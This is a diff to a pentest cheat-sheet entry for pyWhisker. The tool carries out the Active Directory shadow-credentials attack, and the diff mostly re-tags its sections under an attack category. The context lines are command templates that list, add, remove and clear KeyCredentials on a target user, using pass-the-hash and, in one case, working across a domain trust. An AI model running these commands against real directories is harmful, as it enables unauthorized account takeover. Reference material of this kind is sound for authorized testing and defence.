@@ -1,7 +1,8 @@
 # pyWhisker
 
-% dacl, shadow credentials, msDs-KeyCredentialLink, https://github.com/ShutdownRepo/pywhisker
-#plateform/linux #target/remote #cat/AD/RECON 
+% dacl, ShadowCredentials, msDs-KeyCredentialLink, https://github.com/ShutdownRepo/pywhisker
+#plateform/linux #target/remote #cat/ATTACK/AD/DACL-ABUSE/ShadowCredentials
+ 
 
 
 ## pyWhisker - Notes
@@ -55,26 +56,26 @@ pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <t
 
 
 ## remove KeyCredential (pth)
-#cat/ATTACK/AD/DACL-ABUSE
+#cat/ATTACK/AD/DACL-ABUSE/ShadowCredentials
 ```
 pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "remove" --device-id=<device_id>
 ```
 
 ## clear KeyCredential (pth)
-#cat/ATTACK/AD/DACL-ABUSE
+#cat/ATTACK/AD/DACL-ABUSE/ShadowCredentials
 ```
 pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "clear" 
 ```
 
 ## add KeyCredential (pth)
-#cat/ATTACK/AD/DACL-ABUSE
+#cat/ATTACK/AD/DACL-ABUSE/ShadowCredentials
 ```
 pywhisker.py --dc-ip <dc_ip> -d <domain_fqdn> -u <user> -H <nt_hash> --target <target_user> --action "add"  -f <pfx_file> -P <pfx_password|jubeaz>
 ```
 
 
 ## cross-domain - list all current KeyCredentials ID and creation time (cred) (TRUST)
-#cat/ATTACK/AD/DACL-ABUSE
+#cat/ATTACK/AD/DACL-ABUSE/ShadowCredentials
 ```
 pywhisker.py --dc-ip <target_dc_ip> --target-domain <dst_domain_fqdn> -d <domain_fqdn> -u <user> -p <password> --target <target_user> --action "list"
 ```
